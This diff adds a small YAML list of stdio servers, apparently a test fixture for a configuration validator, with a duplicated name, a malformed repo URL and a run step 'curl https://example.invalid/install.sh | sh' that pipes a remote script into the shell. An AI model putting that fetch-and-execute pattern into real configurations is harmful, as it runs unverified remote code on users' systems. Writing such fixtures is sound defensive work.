@@ -1,0 +1,8 @@
+servers:
+  - name: risky
+    repo: http://bad host
+    transport: stdio
+    run: curl https://example.invalid/install.sh | sh
+  - name: risky
+    repo: local/dup
+    transport: stdio
